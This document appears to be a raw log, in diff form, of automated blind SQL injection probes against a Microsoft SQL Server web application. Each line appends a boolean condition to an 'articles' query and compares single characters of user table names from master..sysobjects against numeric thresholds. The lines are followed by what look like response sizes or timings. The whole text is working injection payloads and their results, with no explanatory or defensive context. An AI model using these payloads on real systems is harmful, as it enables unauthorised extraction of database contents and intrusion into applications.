+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),6,1))>108	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),6,1))>106	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),6,1))>107	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),7,1))>96	451
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),7,1))>112	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),7,1))>104	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),7,1))>100	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),7,1))>102	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),7,1))>101	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),8,1))>96	451
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),8,1))>112	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),8,1))>120	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),8,1))>116	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),8,1))>114	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),8,1))>115	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),9,1))>96	451
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),9,1))>48	451
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 0 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),9,1))>1	450
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),1,1))>64	451
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),1,1))>96	451
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),1,1))>112	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),1,1))>104	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),1,1))>100	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),1,1))>102	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),1,1))>101	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),2,1))>96	451
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),2,1))>112	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),2,1))>104	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),2,1))>108	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),2,1))>110	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),2,1))>109	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),3,1))>96	451
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),3,1))>112	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),3,1))>104	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),3,1))>100	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),3,1))>98	451
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),3,1))>99	451
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),4,1))>96	451
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),4,1))>112	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),4,1))>120	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),4,1))>116	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),4,1))>114	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),4,1))>113	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),5,1))>96	451
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),5,1))>112	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),5,1))>120	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),5,1))>124	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),5,1))>122	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),5,1))>121	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),6,1))>96	451
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),6,1))>112	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),6,1))>104	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),6,1))>108	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),6,1))>110	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),6,1))>111	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),7,1))>96	451
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),7,1))>112	452
+	200
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),7,1))>120	452
+	138
+use [master]	86
+	165
+SELECT * FROM articles where article_id = 100 AND UNICODE(SUBSTRING((SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) AND ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) NOT IN (SELECT TOP 1 ISNULL(CAST(name AS NVARCHAR(4000)),CHAR(32)) FROM master..sysobjects WHERE xtype = CHAR(85) ORDER BY name) ORDER BY name),7,1))>116	452
+	138
+use [master]	86
+	165
